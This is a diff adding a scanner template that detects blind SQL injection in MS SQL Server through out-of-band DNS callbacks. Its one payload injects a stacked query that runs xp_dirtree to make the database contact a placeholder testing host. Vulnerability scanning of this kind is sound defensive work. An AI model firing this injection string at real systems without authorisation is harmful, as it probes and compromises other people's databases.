@@ -1,0 +1,18 @@
+id: oast-blind-sqli-mssql
+info:
+  name: "Blind SQL Injection (OAST - MS SQL)"
+  author: "WebX"
+  severity: high
+  description: "Detects Blind SQL Injection by forcing the database to perform a DNS lookup to an external OAST server."
+  tags: sqli, blind, oast, mssql
+vulnerability_type: sqli
+
+payloads:
+  # This payload attempts to execute a command that resolves a UNC path.
+  # The DNS resolution for our OAST domain is the proof of vulnerability.
+  - "'; exec master.dbo.xp_dirtree '\\\\{{OAST}}\\\\a';--"
+
+request:
+  # For OAST-based blind vulnerabilities, we don't need any matchers.
+  # The success or failure is determined entirely out-of-band.
+  - {}
